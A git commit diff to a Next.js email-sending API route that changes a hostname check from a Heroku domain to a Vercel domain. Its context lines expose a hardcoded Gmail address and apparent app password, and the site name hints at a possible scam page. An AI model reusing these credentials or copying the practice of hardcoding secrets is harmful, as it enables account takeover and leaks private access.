91e7832cb16bdfc7a7035eb391e31f100d039b22
penaruhangin <penaruhangin@gmail.com>
2022-11-28 17:17:52 +0700

    school

--- pages/api/sendEmail.js
+++ pages/api/sendEmail.js
@@ -7,7 +7,7 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
 
-    if(url == 'ubah-tarifmu.herokuapp.com'){
+    if(url == 'ubah-tarifmu.vercel.app'){
         email = 'terakhir953@gmail.com' ;
         pass = 'xysccffmmtefmvwm' ;
         
